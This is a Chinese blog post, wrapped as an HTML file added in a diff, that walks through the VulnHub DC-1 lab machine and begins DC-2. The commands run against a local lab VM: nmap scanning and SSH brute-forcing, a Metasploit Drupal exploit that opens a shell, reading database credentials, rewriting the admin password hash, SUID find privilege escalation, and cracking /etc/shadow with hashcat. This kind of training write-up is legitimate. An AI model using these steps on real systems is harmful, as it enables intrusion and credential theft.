@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/upload/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/upload/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/upload/favicon-16x16.png">
+  <link rel="mask-icon" href="/upload/kaoruko.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="DC靶机渗透记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC靶机渗透">
+<meta property="og:url" content="https://hllttz.github.io/2025/10/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="hllttz&#39;s blog">
+<meta property="og:description" content="DC靶机渗透记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:\typora_pic\image-20251009215753111.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009220117526.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009220206544.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009220416935.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009221208770.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009221901690.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009222129485.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009222438945.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009222659056.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009223227047.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009223414472.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009223705444.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009224038698.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009230942697.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009231122449.png">
+<meta property="og:image" content="d:\typora_pic\image-20251009231300601.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010182437402.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010183437089.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010183608803.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010184510686.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010184615650.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010184703028.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010185830978.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010190001859.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010190300409.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010204245868.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010215823481.png">
+<meta property="og:image" content="d:\typora_pic\image-20251010215749937.png">
+<meta property="article:published_time" content="2025-10-09T13:55:31.000Z">
+<meta property="article:modified_time" content="2025-10-10T14:02:27.061Z">
+<meta property="article:author" content="hllttz">
+<meta property="article:tag" content="靶机 wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:\typora_pic\image-20251009215753111.png">
+
+
+<link rel="canonical" href="https://hllttz.github.io/2025/10/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hllttz.github.io/2025/10/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","path":"2025/10/09/DC靶机渗透/","title":"DC靶机渗透"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DC靶机渗透 | hllttz's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">hllttz's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%8F%8A%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">靶机的下载及搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-1"><span class="nav-number">2.</span> <span class="nav-text">DC-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">打点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F"><span class="nav-number">2.3.</span> <span class="nav-text">数据库渗透</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-2"><span class="nav-number">3.</span> <span class="nav-text">DC-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">hllttz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hllttz.github.io/2025/10/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hllttz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hllttz's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DC靶机渗透 | hllttz's blog">
+      <meta itemprop="description" content="DC靶机渗透记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DC靶机渗透
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-09 21:55:31" itemprop="dateCreated datePublished" datetime="2025-10-09T21:55:31+08:00">2025-10-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-10 22:02:27" itemprop="dateModified" datetime="2025-10-10T22:02:27+08:00">2025-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E6%9C%BA-wp/" itemprop="url" rel="index"><span itemprop="name">靶机 wp</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">DC靶机渗透记录</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="靶机的下载及搭建"><a href="#靶机的下载及搭建" class="headerlink" title="靶机的下载及搭建"></a>靶机的下载及搭建</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
+<p>下载后解压得到一个ova文件，用vm打开，报错没事，重试即可。然后启动靶机</p>
+<p><img src="D:\typora_pic\image-20251009215753111.png" alt="image-20251009215753111"></p>
+<p>出现这个界面之后即可，然后把靶机的网络模式改为NAT，确保靶机和kali处于同一网段</p>
+<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在靶机设置里获取靶机的mac地址</p>
+<img src="D:\typora_pic\image-20251009220117526.png" alt="image-20251009220117526" style="zoom:50%;" />
+
+<p>在kali中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009220206544.png" alt="image-20251009220206544"></p>
+<p>得到靶机的ip为<code>192.168.243.136</code></p>
+<p><strong>nmap扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.243.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009220416935.png" alt="image-20251009220416935"></p>
+<p>开放了<code>22</code>,<code>80</code>,<code>111</code>端口,先尝试一下ssh爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ssh-brute 192.168.243.136</span><br></pre></td></tr></table></figure>
+
+<p>爆破了很久无果，果断放弃</p>
+<p><img src="D:\typora_pic\image-20251009221208770.png" alt="image-20251009221208770"></p>
+<p><strong>访问80端口</strong></p>
+<p>访问<code>192.168.243.136</code></p>
+<p><img src="D:\typora_pic\image-20251009221901690.png" alt="image-20251009221901690"></p>
+<p>当然也可以用kali的<code>whatweb</code>扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.243.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009222129485.png" alt="image-20251009222129485"></p>
+<p>现在收集的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CMS是Drupal</span><br><span class="line">Apache 2.2.22</span><br><span class="line">PHP 5.4.45</span><br><span class="line">jQuery 1.4.4 </span><br></pre></td></tr></table></figure>
+
+<h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><p><strong>使用Metasploit进行漏扫</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009222438945.png" alt="image-20251009222438945"></p>
+<p>使用披露时间为<code>2018-03-28</code>的漏洞,接着看一下该漏洞模块参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009222659056.png" alt="image-20251009222659056"></p>
+<blockquote>
+<p>Current Setting是目前设置的内容</p>
+<p>Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置</p>
+<p>就上面来说RHOSTS需要set，但是没有内容</p>
+</blockquote>
+<p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.243.136</span><br></pre></td></tr></table></figure>
+
+<p>然后进行攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">或者</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009223227047.png" alt="image-20251009223227047"></p>
+<p>当出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009223414472.png" alt="image-20251009223414472"></p>
+<p>先把flag1拿了</p>
+<p><img src="D:\typora_pic\image-20251009223705444.png" alt="image-20251009223705444"></p>
+<p>得到个提示，搜索得知这个cms的配置文件是<code>settings.php</code>文件，找一下这个文件的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / -name settings.php</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ find / -name settings.php</span><br><span class="line">find / -name settings.php</span><br><span class="line">/var/www/sites/default/settings.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+
+<p>得到flag2</p>
+<p><img src="D:\typora_pic\image-20251009224038698.png"></p>
+<p>数据库的账号密码<code>dbuser/R0ck3t</code></p>
+<h2 id="数据库渗透"><a href="#数据库渗透" class="headerlink" title="数据库渗透"></a>数据库渗透</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009230942697.png" alt="image-20251009230942697"></p>
+<p>接着使用<code>drupaldb</code>数据库并查看表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009231122449.png" alt="image-20251009231122449"></p>
+<p>查看一下<code>users</code>表里的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251009231300601.png" alt="image-20251009231300601"></p>
+<p>得到<code>admin</code>和<code>Ferd</code>用户的pass字段，尝试一下更改<code>admin</code>的<code>pass</code>字段，实现任意密码重置</p>
+<p><a target="_blank" rel="noopener" href="https://drupalchina.cn/node/2128">https://drupalchina.cn/node/2128</a></p>
+<p><img src="D:\typora_pic\image-20251010182437402.png" alt="image-20251010182437402"></p>
+<p>得知drupal的密码加密脚本存放在<code>/var/www/scripts/password-hash.sh</code>，重置密码的使用方法如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br><span class="line">password: 123456                <span class="built_in">hash</span>: $S<span class="variable">$D</span>/MdQUfce0ZBmd4yIPvIS7F8TnbstjOrCa9M9u8NkdS3tzer0mha</span><br></pre></td></tr></table></figure>
+
+<p>然后进mysql进行替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;update users set pass = &quot;$S$D/MdQUfce0ZBmd4yIPvIS7F8TnbstjOrCa9M9u8NkdS3tzer0mha&quot; where name = &quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251010183437089.png" alt="image-20251010183437089"></p>
+<p>更改成功，我们回到web主页尝试登录</p>
+<p><img src="D:\typora_pic\image-20251010183608803.png" alt="image-20251010183608803"></p>
+<p>得到flag3，我们需要得到<code>/etc/shadow</code>的内容，并且FIND是大写且跟了<code>-exec</code>，尝试find提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null 或者 <span class="built_in">which</span> find <span class="built_in">ls</span> -l  /usr/bin/find </span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251010184510686.png" alt="image-20251010184510686"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /usr/bin/find -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251010184615650.png" alt="image-20251010184615650"></p>
+<p>成功提权，访问<code>/etc/shadow</code></p>
+<p><img src="D:\typora_pic\image-20251010184703028.png" alt="image-20251010184703028"></p>
+<p>尝试进行爆破，将最后一行复制到2.txt，进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 2.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251010185830978.png" alt="image-20251010185830978"></p>
+<p>得到密码<code>orange</code>，ssh链接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.243.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251010190001859.png" alt="image-20251010190001859"></p>
+<p>得到flag4，提示我们要在<code>/root</code>下得到flag，前面已经提权。这步好办</p>
+<p><img src="D:\typora_pic\image-20251010190300409.png" alt="image-20251010190300409"></p>
+<p>得到最终flag</p>
+<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>ip扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:34:06:95, IPv4: 192.168.243.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.243.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.243.2   00:50:56:f9:0d:90       VMware, Inc.</span><br><span class="line">192.168.243.137 00:0c:29:2a:e6:70       VMware, Inc.</span><br><span class="line">192.168.243.254 00:50:56:e1:bb:61       VMware, Inc.</span><br></pre></td></tr></table></figure>
+
+<p>得到ip为192.168.243.137，nmap扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.243.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\typora_pic\image-20251010204245868.png" alt="image-20251010204245868"></p>
+<p>开放了80端口，ssh端口改到了7744,尝试访问web端会重定向到<code>http://dc-2</code>。我们本地dns绑定下</p>
+<p>host编辑页在<code>C:\Windows\System32\drivers\etc</code>中</p>
+<p><img src="D:\typora_pic\image-20251010215823481.png" alt="image-20251010215823481"></p>
+<p>就能进去了</p>
+<p><img src="D:\typora_pic\image-20251010215749937.png" alt="image-20251010215749937"></p>
+<p>直接就能进去了，拿到第一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
+
+<p>搜索cewl，是一个字典生成工具</p>
+<blockquote>
+<p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E6%9C%BA-wp/" rel="tag"># 靶机 wp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/09/%E6%8F%90%E6%9D%83-%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="prev" title="提权_基础篇">
+                  <i class="fa fa-angle-left"></i> 提权_基础篇
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hllttz</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">322k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:53</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
